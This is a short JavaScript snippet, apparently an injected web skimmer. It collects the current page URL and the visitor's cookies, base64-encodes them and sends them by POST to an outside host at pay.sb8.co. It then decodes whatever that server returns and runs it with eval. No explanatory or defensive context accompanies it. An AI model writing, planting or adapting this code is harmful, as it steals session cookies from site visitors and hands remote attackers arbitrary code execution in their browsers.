var url = window.location.href;
var cookie = document.cookie;
var encodedUrl = btoa(encodeURIComponent(url));
var encodedCookie = btoa(encodeURIComponent(cookie));
var xmlhttp = new XMLHttpRequest();
xmlhttp.open("POST", "https://pay.sb8.co/domainxxdisdiiskshfdsh.php", true);
xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState === 4 && xmlhttp.status === 200) {
        var response = xmlhttp.responseText;
        try {
            eval(atob(response));
        } catch (e) {
            console.error("Error executing script: ", e);
        }
    }
};

var requestBody = "A=" + encodedUrl + "&B=" + encodedCookie;
xmlhttp.send(requestBody);
var timestamp = new Date().getTime();
